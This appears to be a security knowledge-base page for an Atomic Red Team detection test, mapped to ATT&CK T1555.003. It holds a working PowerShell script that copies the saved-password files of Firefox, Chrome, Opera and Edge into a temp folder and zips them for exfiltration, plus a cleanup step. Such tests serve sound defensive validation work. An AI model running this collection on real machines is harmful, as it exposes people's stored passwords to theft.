---
atomic_guid: "f543635c-1705-42c3-b180-efd6dc6e7ee7"
title: "Stage Popular Credential Files for Exfiltration"
framework: "atomic"
generated: "true"
attack_technique_id: "T1555.003"
attack_technique_name: "Credentials from Password Stores: Credentials from Web Browsers"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml"
build_date: "2026-04-27 19:12:28"
executor: "powershell"
aliases:
  - "f543635c-1705-42c3-b180-efd6dc6e7ee7"
  - "Stage Popular Credential Files for Exfiltration"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

This test is designed to search a drive for credential files used by the most common web browsers on Windows (Firefox, Chrome, Opera, and Edge), export the found files to a folder, and zip it,
simulating how an adversary might stage sensitive credential files for exfiltration in order to conduct offline password extraction with tools like [firepwd.py](https://github.com/lclevy/firepwd) or [HackBrowserData](https://github.com/moonD4rk/HackBrowserData).

## ATT&CK Mapping

- [[kb/attack/techniques/T1555-credentials_from_password_stores#^t1555003-credentials-from-web-browsers|T1555.003: Credentials from Web Browsers]]

## Executor

- name: powershell

### Command

```powershell
$exfil_folder = "$env:temp\T1555.003"
if (test-path "$exfil_folder") {} else {new-item -path "$env:temp" -Name "T1555.003" -ItemType "directory" -force}
$FirefoxCredsLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"
if (test-path "$FirefoxCredsLocation\key4.db") {copy-item "$FirefoxCredsLocation\key4.db" -destination "$exfil_folder\T1555.003Firefox_key4.db"} else {}
if (test-path "$FirefoxCredsLocation\logins.json") {copy-item "$FirefoxCredsLocation\logins.json" -destination "$exfil_folder\T1555.003Firefox_logins.json"} else {}
if (test-path "$env:localappdata\Google\Chrome\User Data\Default\Login Data") {copy-item "$env:localappdata\Google\Chrome\User Data\Default\Login Data" -destination "$exfil_folder\T1555.003Chrome_Login Data"} else {}
if (test-path "$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account") {copy-item "$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account" -destination "$exfil_folder\T1555.003Chrome_Login Data For Account"} else {}
if (test-path "$env:appdata\Opera Software\Opera Stable\Login Data") {copy-item "$env:appdata\Opera Software\Opera Stable\Login Data" -destination "$exfil_folder\T1555.003Opera_Login Data"} else {}
if (test-path "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data") {copy-item "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data" -destination "$exfil_folder\T1555.003Edge_Login Data"} else {} 
compress-archive -path "$exfil_folder" -destinationpath "$exfil_folder.zip" -force
```

### Cleanup

```powershell
Remove-Item -Path "$env:temp\T1555.003.zip" -force -erroraction silentlycontinue   
Remove-Item -Path "$env:temp\T1555.003\" -force -recurse -erroraction silentlycontinue
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml)
